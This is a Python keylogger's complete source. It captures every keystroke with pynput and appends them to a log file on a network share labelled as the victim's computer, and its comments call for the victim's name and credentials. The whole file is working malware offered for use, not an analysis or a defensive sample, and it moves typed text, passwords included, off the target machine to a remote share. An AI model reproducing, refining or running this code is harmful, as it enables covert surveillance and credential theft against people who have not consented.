import pynput
import os
import win32wnet

# Network path to the shared folder
NETWORK_PATH = r"\\DESKTOP-VICTIM\SharedLogs"  # Replace with the victim's computer name or IP
LOG_FILE = os.path.join(NETWORK_PATH, "key_log.txt")

# Network credentials (if required)
USERNAME = None  # Replace with the victim's username if authentication is required
PASSWORD = None  # Replace with the victim's password if authentication is required

uppercase_active = True  # Tracks if uppercase (Caps Lock/Shift) is active

def read_last_line():
    """
    Read the existing contents of the log file.
    """
    try:
        with open(LOG_FILE, "r") as file:
            return file.readlines()
    except FileNotFoundError:
        return []

def map_network_drive():
    """
    Map the shared network folder. Handles authentication if needed.
    """
    try:
        win32wnet.WNetAddConnection2(
            0,  # Resource type (disk)
            NETWORK_PATH,  # Network path
            None,  # Local drive letter (None for no mapping)
            None,  # Username for authentication
            None   # Password for authentication
        )
        print(f"Successfully connected to {NETWORK_PATH}")
    except Exception as e:
        print(f"Error mapping network drive: {e}")

def write_to_file(key, append=True):
    """
    Writes the captured key to the log file in the shared folder.
    """
    try:
        with open(LOG_FILE, "a" if append else "w") as file:
            file.write(key)
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_press(key):
    """
    Event triggered when a key is pressed.
    """
    global uppercase_active
    try:
        if key == pynput.keyboard.Key.space:
            write_to_file(" ")
        elif key == pynput.keyboard.Key.enter:
            write_to_file("\n")
        elif key == pynput.keyboard.Key.backspace:
            lines = read_last_line()
            if lines:
                # Remove the last character (simulating backspace)
                updated_content = ''.join(lines)[:-1]
                with open(LOG_FILE, "w") as file:
                    file.write(updated_content)
        elif key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
            uppercase_active = True
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char.upper() if uppercase_active else key.char.lower()
            write_to_file(char)
        else:
            write_to_file(f"[{key}]")
    except Exception as e:
        print(f"Error capturing key press: {e}")

def on_release(key):
    """
    Event triggered when a key is released.
    """
    global uppercase_active
    if key == pynput.keyboard.Key.esc:
        # Stop listener if ESC is pressed
        return False
    elif key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
        uppercase_active = False


if __name__ == "__main__":
    # Map the shared network drive
    map_network_drive()

    # Start the keylogger
    print("Starting network keylogger...")
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
